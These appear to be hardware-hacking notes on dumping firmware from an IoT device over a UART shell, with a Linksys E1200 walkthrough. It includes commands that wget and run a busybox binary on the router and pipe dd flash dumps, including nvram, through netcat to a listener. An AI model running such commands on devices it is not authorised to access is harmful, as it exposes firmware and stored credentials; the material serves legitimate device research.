# Firmware extraction

##

From hardware (PCB)

... SPI, I2C

## From software (UART, etc.)

**Example of extracting a specific device block from an IoT device**

```bash
$ cat /proc/mtd

$ dd if=/dev/mtdX | nc <LISTENER_ADDR> <PORT> 
# eg.
$ dd if=/dev/mtdX | nc 192.168.1.100 1234
```

Find the device number from `/proc/mtd`, and extract it via the `dd` file. Replace `mtdX` with the appropriate number, eg. `mtd2`&#x20;

**Example on the** [**Linksys E1200** ](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/iot-hardware-hacking/research-projects/linksys-e1200-v2)**(entire firmware)**

```console
# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00040000 00010000 "boot"
mtd1: 007b0000 00010000 "linux"
mtd2: 00660804 00010000 "rootfs"
mtd3: 00010000 00010000 "nvram"

# ls /dev
console    loop0      loop7      mtd2ro     null       shm        zero
ctmisc     loop1      mem        mtd3       nvram      tty
full       loop2      mtd0       mtd3ro     port       ttyS0
fuse       loop3      mtd0ro     mtdblock0  ppp        ttyS1
gpio       loop4      mtd1       mtdblock1  ptmx       ttyS2
kmem       loop5      mtd1ro     mtdblock2  pts        ttyS3
kmsg       loop6      mtd2       mtdblock3  random     urandom
```

* `mtd0/mtd0ro/mtdblock0`("boot"):&#x20;
  * the bootloader
  * initializes the hardware before loading the OS
* `mtd1/mtd1ro/mtdblock1`("linux"):&#x20;
  * the complete system firmware image
  * contains the Linux kernel + the root filesystem&#x20;
  * contains `mtd2` (root filesystem) too right after the kernel portion
* `mtd2/mtd2ro/mtdblock2`("rootfs"):
  * the root filesystem only
  * is actually present in `mtd1`
* `mtd3/mtd3ro/mtdblock3`("nvram"):
  * non-volatile RAM
  * stores runtime configuration variables<br>

To get our hands on the entire firmware (bootloader, kernel, root FS, nvram), we have to extract: `mtdblock0`, `mtdblock1` and `mtdblock3`

Before we proceed, we have to download the `busybox-mipsel` tool to access the `dd` and `nc` tools that are not available natively on this router

{% code title="Main machine (hosting busybox-mipsel)" %}
```shellscript
$ ls
busybox-mipsel
$ python3 -m http.server 8888
```
{% endcode %}

{% code title="Linksys E1200" %}
```console
# wget http://[IP]:8888/busybox-mipsel -O /tmp/busybox-mipsel
# chmod +x /tmp/busybox-mipsel
# /tmp/busybox-mipsel dd --help
```
{% endcode %}

**From the UART console (Linksys E1200):**

<pre class="language-console"><code class="lang-console"><strong># /tmp/busybox-mipsel dd if=/dev/mtdblock0 | /tmp/busybox-mipsel nc [IP] [PORT] # captures boot
</strong># /tmp/busybox-mipsel dd if=/dev/mtdblock1 | /tmp/busybox-mipsel nc [IP] [PORT]  # captures linux+RootFS
# /tmp/busybox-mipsel dd if=/dev/mtdblock3 | /tmp/busybox-mipsel nc [IP] [PORT]  # captures nvram
</code></pre>

**From the main machine:**

```shellscript
$ nc -lp [PORT] > boot.bin
$ nc -lp [PORT] > linux+rootFS.bin
$ nc -lp [PORT] > nvram.bin

# combine
$ cat boot.bin linux+rootFS.bin nvram.bin > linskys_e1200_fw2.0.02.bin
```



## Resources

[https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/en/](https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/en/)

{% embed url="https://www.youtube.com/watch?time_continue=1&v=Kxvpbu9STU4&embeds_referring_euri=https%3A%2F%2Fcdn.iframe.ly%2F&source_ve_path=MjM4NTE" %}





